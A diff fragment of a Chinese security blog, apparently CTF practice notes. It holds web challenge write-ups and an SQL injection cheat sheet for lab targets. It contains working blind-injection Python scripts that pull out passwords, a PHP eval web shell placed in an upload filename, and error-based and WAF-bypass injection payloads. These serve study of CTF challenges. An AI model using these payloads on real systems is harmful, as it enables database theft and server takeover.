+<p>参考：<a target="_blank" rel="noopener" href="https://ca01h.top/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5/#%E5%BC%BA%E7%BD%91%E6%9D%AF2019-Fakebook">https://ca01h.top/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5/#%E5%BC%BA%E7%BD%91%E6%9D%AF2019-Fakebook</a></p>
+<p>进入页面，只有一个登录页面</p>
+<p>随手将URL换成robots.txt，提示访问hint.txt</p>
+<p>访问hint.txt，有如下提示</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Only u input the correct password then u can get the flag</span><br><span class="line">and p3rh4ps wants a girl friend.</span><br><span class="line"></span><br><span class="line">select * from users where username&#x3D;&#39;$_POST[&quot;username&quot;]&#39; and password&#x3D;&#39;$_POST[&quot;password&quot;]&#39;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;鍑洪浜哄洓绾у帇绾挎墠杩� 瑙佽皡瑙佽皡 棰嗕細绮剧</span><br></pre></td></tr></table></figure>
+<p>乱码部分转换后</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">出题人四级压线才? 见谅见谅 领会精神</span><br></pre></td></tr></table></figure>
+<p>经测试，单引号被waf拦截，and被waf拦截</p>
+<p>使用类似Web1的转译单引号绕过方法啊</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: 1\</span><br><span class="line">password: or&#x2F;**&#x2F;payload#</span><br></pre></td></tr></table></figure>
+<p>后面不做了，就套模板。超参考链接的wp</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from time import sleep</span><br><span class="line"></span><br><span class="line">url&#x3D;&quot;http:&#x2F;&#x2F;c4a52ced-49ff-4797-b075-989df5c9ad7a.node3.buuoj.cn&#x2F;index.php&quot;</span><br><span class="line"></span><br><span class="line">data &#x3D; &#123;</span><br><span class="line">    &#39;username&#39;: &#39;admin\\&#39;,</span><br><span class="line">    &#39;password&#39;: &#39;&#39;</span><br><span class="line">&#125;</span><br><span class="line">flag &#x3D; &#39;BJD needs to be stronger&#39;</span><br><span class="line">result &#x3D; &#39;&#39;</span><br><span class="line"></span><br><span class="line">for i in range(1, 50):</span><br><span class="line">    sleep(0.5)</span><br><span class="line">    high &#x3D; 127</span><br><span class="line">    low &#x3D; 32</span><br><span class="line">    while high &gt; low:</span><br><span class="line">        mid &#x3D; (high + low) &#x2F;&#x2F; 2</span><br><span class="line">        payload &#x3D; &quot;or&#x2F;**&#x2F;if(ascii(substr(password,%d,1))&gt;%d,1,0)#&quot; % (i, mid)</span><br><span class="line">        data[&#39;password&#39;] &#x3D; payload</span><br><span class="line"></span><br><span class="line">        rs &#x3D; requests.post(url&#x3D;url, data&#x3D;data)</span><br><span class="line"></span><br><span class="line">        if flag in rs.text:</span><br><span class="line">            low &#x3D; mid + 1</span><br><span class="line">        else:</span><br><span class="line">            high &#x3D; mid</span><br><span class="line"></span><br><span class="line">    if low !&#x3D; 32:</span><br><span class="line">        result +&#x3D; chr(low)</span><br><span class="line">    else:</span><br><span class="line">        break</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>
+<p>得到一个字符串，在登录框用户名输入admin，密码输入该字符串，得到flag</p>
+<h1 id="comment"><a href="#comment" class="headerlink" title="comment"></a>comment</h1><p>待做，考的知识点比较多</p>
+<h1 id="easyweb"><a href="#easyweb" class="headerlink" title="easyweb"></a>easyweb</h1><p>来源：CISCN2019</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://ca01h.top/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5/#CISCN2019-easyweb">https://ca01h.top/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5/#CISCN2019-easyweb</a></p>
+<p><strong>失败的尝试</strong></p>
+<p>打开网页，是一个登录界面</p>
+<p>尝试一些简单注入，失败</p>
+<p>访问robots.txt，提示每个php文件有bak</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: *.php.bak</span><br></pre></td></tr></table></figure>
+<p>但是index.php的bak出不来</p>
+<p>在firefox调试面板的网络中，发现登录页面的数据是交给user.php的，但是单独访问user.php是没有结果的</p>
+<p>在登录界面，尝试输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">username: admin&#39; or &#39;1&#39;&#x3D;&#39;1 #</span><br><span class="line">password: 123</span><br><span class="line"></span><br><span class="line">username: 123</span><br><span class="line">password: 456</span><br></pre></td></tr></table></figure>
+<p>发现两者返回的图片不一样</p>
+<p>再次打开页面查看器，发现img的标签是这样的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;image.php?id&#x3D;2&quot; width&#x3D;&quot;200&quot; height&#x3D;&quot;200&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>直接访问image.php?id=1，是可以访问的</p>
+<p><strong>正确wp</strong></p>
+<p>下面参考别人的wp</p>
+<p>使用dirmap扫描出有image.php.bak文件（这个不知道咋操作，一直因为too many request无法得出正确结果</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># image.php.bak</span></span><br><span class="line">&lt;﻿?php</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>])?<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>]:<span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="variable">$path</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;path&quot;</span>])?<span class="variable">$_GET</span>[<span class="string">&quot;path&quot;</span>]:<span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=addslashes(<span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$path</span>=addslashes(<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,<span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$path</span>=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span>=mysqli_query(<span class="variable">$con</span>,<span class="string">&quot;select * from images where id=&#x27;<span class="subst">&#123;$id&#125;</span>&#x27; or path=&#x27;<span class="subst">&#123;$path&#125;</span>&#x27;&quot;</span>);</span><br><span class="line"><span class="variable">$row</span>=mysqli_fetch_array(<span class="variable">$result</span>,MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line"><span class="variable">$path</span>=<span class="string">&quot;./&quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;path&quot;</span>];</span><br><span class="line">header(<span class="string">&quot;Content-Type: image/jpeg&quot;</span>);</span><br><span class="line">readfile(<span class="variable">$path</span>);</span><br></pre></td></tr></table></figure>
+<p>发现，语句为”select * from images where id=’{$id}‘ or path=’{$path}’”</p>
+<p>发现，使用了addslashes和str_replace</p>
+<p>​    此处，addslashes是在斜杠\前再添加一个斜杠进行转译；而str_replace是把那四个字符替换为空</p>
+<p>而目的是传入的id值最终为/，从而过滤掉之后的单引号</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;&#39;&#x2F;&#39; and path&#x3D;&#39;payload#&#39;</span><br></pre></td></tr></table></figure>
+<p>因此id传入//0</p>
+<p>之后不写了，抄wp</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from time import sleep</span><br><span class="line"></span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;eff1faa0-512a-48cd-afc2-155bb1119cb2.node3.buuoj.cn&#x2F;image.php?id&#x3D;\\0&amp;path&#x3D;&quot;</span><br><span class="line">#payload &#x3D; &quot;or id&#x3D;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;0&#125;,1))&gt;&#123;1&#125;,1,0)%23&quot;</span><br><span class="line">#payload &#x3D; &quot;or id&#x3D;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;),&#123;0&#125;,1))&gt;&#123;1&#125;,1,0)%23&quot;</span><br><span class="line">#payload &#x3D; &quot;or id&#x3D;if(ascii(substr((select username from users),&#123;0&#125;,1))&gt;&#123;1&#125;,1,0)%23&quot;</span><br><span class="line">payload &#x3D; &quot;or id&#x3D;if(ascii(substr((select password from users),&#123;0&#125;,1))&gt;&#123;1&#125;,1,0)%23&quot;</span><br><span class="line">flag &#x3D; &quot;JFIF&quot;</span><br><span class="line">result &#x3D; &quot;&quot;</span><br><span class="line"></span><br><span class="line">for i in range(1, 100):</span><br><span class="line">    sleep(0.5)</span><br><span class="line">    low &#x3D; 32</span><br><span class="line">    high &#x3D; 127</span><br><span class="line">    while high &gt; low:</span><br><span class="line">        mid &#x3D; (high + low) &gt;&gt; 1</span><br><span class="line">        response &#x3D; requests.get(url + payload.format(i, mid))</span><br><span class="line">        if flag in response.text:</span><br><span class="line">            low &#x3D; mid + 1</span><br><span class="line">        else:</span><br><span class="line">            high &#x3D; mid</span><br><span class="line"></span><br><span class="line">    if low !&#x3D; 32:</span><br><span class="line">        result +&#x3D; chr(low)</span><br><span class="line">    else:</span><br><span class="line">        break</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a59e57715afd21f67dbc</span><br></pre></td></tr></table></figure>
+<p>wp说登录后是一个文件上传绕过，可使用短标签绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&lt;?&#x3D;@eval($_POST([&#39;a&#39;]));?&gt;</span><br></pre></td></tr></table></figure>
+<p>这一步一直没连上，跳过</p>
+<h1 id="颜值成绩查询"><a href="#颜值成绩查询" class="headerlink" title="颜值成绩查询"></a>颜值成绩查询</h1><p>来源：WUSTCTF2020</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://ca01h.top/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5/#CISCN2019-easyweb">https://ca01h.top/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5/#CISCN2019-easyweb</a></p>
+<p><strong>错误尝试</strong></p>
+<p>单引号注入，双引号注入，扫描目录，查看源码，robots.txt</p>
+<p><strong>正确方法</strong></p>
+<p>不需要单引号注入啊直接写语句</p>
+<p><img src=".%5Cpic%5CCTF-Web-SQL%E6%B3%A8%E5%85%A5-%E9%A2%9C%E5%80%BC%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2.png" alt="CTF-Web-SQL注入-颜值成绩查询"></p>
+<p>后面的跳过，就是正常的那种布尔盲注</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/01/20/CTF-Web-SQL%E6%B3%A8%E5%85%A5/" data-id="ckkdrz0z40006ugus6naj9ngh" data-title="CTF-Web-SQL注入" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-摘抄-《通往奴役之路》" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2021/01/19/%E6%91%98%E6%8A%84-%E3%80%8A%E9%80%9A%E5%BE%80%E5%A5%B4%E5%BD%B9%E4%B9%8B%E8%B7%AF%E3%80%8B/" class="article-date">
@@ -251,6 +790,9 @@
 <p>因此，可以构造序列化字符串，绕过相关过滤</p>
 <p>本题中逃逸的解析</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">未过滤前</span><br><span class="line">_SESSION[flagflag]=<span class="string">&quot;;s:3:&quot;</span>aaa<span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>ZDBnM19mMWFnLnBocA==<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string">序列化后</span></span><br><span class="line"><span class="string">a:2:&#123;</span></span><br><span class="line"><span class="string">	s:8:&quot;</span>flagflag<span class="string">&quot;;</span></span><br><span class="line"><span class="string">	s:58:&quot;</span></span><br><span class="line">		<span class="string">&quot;;s:3:&quot;</span>aaa<span class="string">&quot;;</span></span><br><span class="line"><span class="string">		s:3:&quot;</span>img<span class="string">&quot;;</span></span><br><span class="line"><span class="string">		s:20:&quot;</span>ZDBnM19mMWFnLnBocA==<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string">	&quot;</span>;</span><br><span class="line">	s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;</span><br><span class="line">	s:<span class="number">20</span>:<span class="string">&quot;Z3Vlc3RfaW1nLnBuZw==&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">过滤后</span><br><span class="line">a:<span class="number">2</span>:&#123;</span><br><span class="line">	s:<span class="number">8</span>:<span class="string">&quot;&quot;</span>;</span><br><span class="line">	s:<span class="number">58</span>:<span class="string">&quot;</span></span><br><span class="line"><span class="string">		&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;aaa&quot;</span>;</span><br><span class="line">		s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;</span><br><span class="line">		s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;</span><br><span class="line">	<span class="string">&quot;;</span></span><br><span class="line"><span class="string">	s:3:&quot;</span>img<span class="string">&quot;;</span></span><br><span class="line"><span class="string">	s:20:&quot;</span>Z3Vlc3RfaW1nLnBuZw==<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string">反序列化填充后，再序列化时</span></span><br><span class="line"><span class="string">a:2:&#123;</span></span><br><span class="line"><span class="string">	s:8:&quot;</span>s:<span class="number">58</span>:<span class="string">&quot;&quot;</span>;<span class="string">&quot;; // 字符串里的东西随便填</span></span><br><span class="line"><span class="string">		s:3:&quot;</span>aaa<span class="string">&quot;;</span></span><br><span class="line"><span class="string">	s:3:&quot;</span>img<span class="string">&quot;;</span></span><br><span class="line"><span class="string">		s:20:&quot;</span>ZDBnM19mMWFnLnBocA==<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string">	&quot;</span>;</span><br><span class="line">	s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;</span><br><span class="line">	s:<span class="number">20</span>:<span class="string">&quot;Z3Vlc3RfaW1nLnBuZw==&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="Easy-MD5"><a href="#Easy-MD5" class="headerlink" title="Easy MD5"></a>Easy MD5</h1><h2 id="php下的MD5函数"><a href="#php下的MD5函数" class="headerlink" title="php下的MD5函数"></a>php下的MD5函数</h2><p>md5(string,raw)</p>
+<p>string：必须，规定要计算的字符串</p>
+<p>raw：输出格式。TRUE，原始16字符二进制格式；FALSE，默认，32字符十六进制数</p>
 
       
     </div>
@@ -267,9 +809,9 @@
 
 
   
-    <article id="post-SQL注入总结" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-CTF-Web-SQL注入总结" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2021/01/15/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/" class="article-date">
+    <a href="/2021/01/15/CTF-Web-SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/" class="article-date">
   <time class="dt-published" datetime="2021-01-15T00:51:02.000Z" itemprop="datePublished">2021-01-15</time>
 </a>
     
@@ -281,7 +823,7 @@
         
   
     <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/01/15/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/">SQL注入总结</a>
+      <a class="p-name article-title" href="/2021/01/15/CTF-Web-SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/">SQL注入总结</a>
     </h1>
   
 
@@ -290,13 +832,16 @@
     <div class="e-content article-entry" itemprop="articleBody">
       
         <p>主要是方便我自己查</p>
-<h1 id="基本报错注入"><a href="#基本报错注入" class="headerlink" title="基本报错注入"></a>基本报错注入</h1><p>例题：sqllabs Less1、2、3、4</p>
+<h1 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h1><h2 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a>information_schema</h2><p>例题：sqllabs Less1、2、3、4</p>
 <p>知识点：information_schema使用</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 爆数据库名</span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> group_concat(scheme_name) <span class="keyword">from</span> information_schema.schemata) <span class="comment">--+ </span></span><br><span class="line"># 爆表名</span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span>) <span class="comment">--+</span></span><br><span class="line"># 爆列名</span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>) <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
-<h1 id="XPath报错注入"><a href="#XPath报错注入" class="headerlink" title="XPath报错注入"></a>XPath报错注入</h1><p>例题：sqllabs less5、6</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 爆数据库名</span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>, group_concat(scheme_name) <span class="keyword">from</span> information_schema.schemata <span class="comment">--+ </span></span><br><span class="line"># 爆表名</span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>, group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> <span class="comment">--+</span></span><br><span class="line"># 爆列名</span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>, group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">无空格版本</span><br><span class="line"><span class="keyword">select</span>(group_concat(scheme_name))<span class="keyword">from</span>(information_schema.schemata))#</span><br><span class="line"><span class="keyword">select</span>(group_concat(table_name))<span class="keyword">from</span>(information_schema.tables)<span class="keyword">where</span>(table_schema<span class="operator">=</span><span class="string">&#x27;web_sqli&#x27;</span>)#</span><br><span class="line"><span class="keyword">select</span>(group_concat(column_name))<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span>(table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>)#</span><br></pre></td></tr></table></figure>
+<h2 id="不适用information-schema"><a href="#不适用information-schema" class="headerlink" title="不适用information_schema"></a>不适用information_schema</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema&#x3D;database()</span><br><span class="line">select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema&#x3D;database()</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="XPath报错注入"><a href="#XPath报错注入" class="headerlink" title="XPath报错注入"></a>XPath报错注入</h1><h2 id="updatexml和extractvalue"><a href="#updatexml和extractvalue" class="headerlink" title="updatexml和extractvalue"></a>updatexml和extractvalue</h2><p>例题：sqllabs less5、6</p>
 <p>语句</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">其中payload为你要插入的SQL语句需要注意的是该语句将 输出字符长度限制为64个字符</span><br><span class="line"></span><br><span class="line">(1). 通过updatexml报错</span><br><span class="line">and updatexml(1,concat(&#39;~&#39;,payload),1) and &#39;1&#39;&#x3D;&#39;1 --+</span><br><span class="line"></span><br><span class="line">同样该语句对输出的字符长度也做了限制，其最长输出32位并且该语句对payload的返回类型也做了限制，只有在payload返回的不是xml格式才会生效</span><br><span class="line"></span><br><span class="line">(2). 通过ExtractValue报错</span><br><span class="line">and extractvalue(1,concat(0x26,payload,0x26)) and &#39;1&#39;&#x3D;&#39;1 --+</span><br><span class="line"></span><br><span class="line">输出字符有长度限制，最长32位。</span><br><span class="line"></span><br><span class="line">然后就构造payload</span><br></pre></td></tr></table></figure>
-<h1 id="双查询注入（floor）"><a href="#双查询注入（floor）" class="headerlink" title="双查询注入（floor）"></a>双查询注入（floor）</h1><p>例题：less5</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">其中payload为你要插入的SQL语句需要注意的是该语句将 输出字符长度限制为32个字符</span><br><span class="line"></span><br><span class="line">(1). 通过updatexml报错</span><br><span class="line">and updatexml(1,concat(0x7e,SUBSTR((payload),1,24),0x7e),1) </span><br><span class="line">and updatexml(1,concat(0x7e,SUBSTR((database()),1,24),0x7e),1)</span><br><span class="line">and updatexml(1,concat(0x7e,(database(),0x7e),1) </span><br><span class="line"></span><br><span class="line">需要配合substr使用</span><br><span class="line">同样该语句对输出的字符长度也做了限制，其最长输出32位并且该语句对payload的返回类型也做了限制，只有在payload返回的不是xml格式才会生效</span><br><span class="line"></span><br><span class="line">(2). 通过ExtractValue报错</span><br><span class="line">and extractvalue(1,concat(0x26,substr((payload),1,24),0x26)) and &#39;1&#39;&#x3D;&#39;1 --+</span><br><span class="line"></span><br><span class="line">输出字符有长度限制，最长32位。</span><br><span class="line"></span><br><span class="line">然后就构造payload</span><br></pre></td></tr></table></figure>
+<h2 id="双查询注入（floor）"><a href="#双查询注入（floor）" class="headerlink" title="双查询注入（floor）"></a>双查询注入（floor）</h2><p>例题：less5</p>
 <p>原理：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过floor报错的方法来爆数据的本质是group by语句的报错。group by语句报错的原因是floor(random(0)*2)的不确定性，即可能为0也可能为1（group by key的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不在临时表中则更新临时表中的数据；如果该key不存在于临时表中，则在临时表中插入key所在行的数据。group by floor(random(0)*2)出错的原因是key是个随机数，检测临时表中key是否存在时计算了一下floor(random(0)*2)可能为0，如果此时临时表只有key为1的行不存在key为0的行，那么数据库要将该条记录插入临时表，由于是随机数，插时又要计算一下随机值，此时floor(random(0)*2)结果可能为1，就会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值。</span><br></pre></td></tr></table></figure>
 <p>语句格式：</p>
@@ -308,14 +853,25 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 此脚本为返回数据库名，替换database()处即可</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://192.168.64.2/sqllabs/Less-8?id=1&#x27; and %s--+&quot;</span></span><br><span class="line"></span><br><span class="line">ans = <span class="string">&quot;&quot;</span></span><br><span class="line">success_text = <span class="string">&quot;You are in...........&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">	flag = <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">127</span>):</span><br><span class="line">		c = <span class="built_in">chr</span>(j)</span><br><span class="line">		s = <span class="string">&quot;substr(database(),&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;,1)=&#x27;&quot;</span> + c + <span 